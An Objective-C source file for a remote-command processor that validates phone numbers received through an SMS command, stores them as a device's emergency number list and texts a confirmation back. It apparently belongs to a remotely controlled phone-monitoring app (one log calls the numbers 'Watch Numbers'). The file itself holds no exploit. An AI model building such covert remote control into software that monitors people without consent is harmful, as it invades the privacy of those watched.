/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ResetEmergencyNumberProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "ResetEmergencyNumberProcessor.h"
#import "PrefEmergencyNumber.h"
#import "Preference.h"

@interface ResetEmergencyNumberProcessor (PrivateAPI)
- (void) processResetEmergencyNumber;
- (void) resetEmergencyNumberException: (NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canResetEmergencyNumber;
- (BOOL) checkValidLengthOfEmergencyNumbers;
@end

@implementation ResetEmergencyNumberProcessor

@synthesize mEmergencyNumberList;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ResetEmergencyNumberProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description:(self) ResetEmergencyNumberProcessor
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ResetEmergencyNumberProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor  Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ResetEmergencyNumberProcessor
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"ResetEmergencyNumberProcessor--->doProcessingCommand")
 	
	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {
		[self setMEmergencyNumberList:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kPhoneNumberValidation]];
		DLog(@"ResetEmergencyNumberProcessor--->Watch Numbers:%@", mEmergencyNumberList);
		if ([mEmergencyNumberList count] > 0) {
			if ([self canResetEmergencyNumber]) {
				if (![RemoteCmdProcessorUtils isDuplicateTelephoneNumber:mEmergencyNumberList]) {
					if ([self checkValidLengthOfEmergencyNumbers]) {
						[self processResetEmergencyNumber];
					} else {
						[self resetEmergencyNumberException:kCmdExceptionErrorInvalidNumberToEmergencyList];
					}
				} else {
					[self resetEmergencyNumberException:kCmdExceptionErrorCannotAddDuplicateToEmergencyList];
				}
			}
			else {								  
				[self resetEmergencyNumberException:kCmdExceptionErrorEmergencyNumberExceedListCapacity];
			}
		}
		else {
			[self resetEmergencyNumberException:kCmdExceptionErrorInvalidNumberToEmergencyList];
		}
	} else {
		[self resetEmergencyNumberException:kCmdExceptionErrorInvalidCmdFormat];
	}	
}

#pragma mark ResetEmergencyNumberProcessor PrivateAPI Methods

/**
 - Method name: processResetEmergencyNumber
 - Purpose:This method is used to process reset Emergency Number
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processResetEmergencyNumber {
	DLog (@"ResetEmergencyNumberProcessor--->processAddEmergencyNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefEmergencyNumber *prefEmergencyNumberList = (PrefEmergencyNumber *) [prefManager preference:kEmergency_Number];
	[prefEmergencyNumberList setMEmergencyNumbers:mEmergencyNumberList];
	[prefManager savePreferenceAndNotifyChange:prefEmergencyNumberList];
	[self sendReplySMS];
}

/**
 - Method name: canResetEmergencyNumber
 - Purpose:This method is to check maximum emergency number list capacity. 
 - Argument list and description: No Argument
 - Return description: BOOL
 */

- (BOOL) canResetEmergencyNumber {
	DLog (@"ResetEmergencyNumberProcessor--->canResetEmergencyNumber");
	//id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	//PrefEmergencyNumber *prefEmergencyNumberList = (PrefEmergencyNumber *) [prefManager preference:kEmergency_Number];
	//int count=[[prefEmergencyNumberList mEmergencyNumbers] count]+[mEmergencyNumberList count];
	int count = [mEmergencyNumberList count];
	DLog (@"> count %d", count)
	if (count <= EMERGENCY_NUMBER_LIST_CAPACITY) {
		return YES;
	}
	else {
		return NO;
	}
}

- (BOOL) checkValidLengthOfEmergencyNumbers {
	BOOL valid = YES;
	for (NSString *emergencyNumber in mEmergencyNumberList) {
		if ([emergencyNumber length] < 5) {
			valid = NO;
			break;
		}
	}
	return (valid);
}

/**
 - Method name: resetEmergencyNumberException
 - Purpose:This method is invoked when emergency number process failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) resetEmergencyNumberException: (NSUInteger) aErrorCode {
	DLog (@"ResetEmergencyNumberProcessor--->resetEmergencyNumberException")
	FxException* exception = [FxException exceptionWithName:@"resetEmergencyNumberException" andReason:@"Reset Emergency number error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"ResetEmergencyNumberProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mEmergencyNumberList release];
	[super dealloc];
}

@end
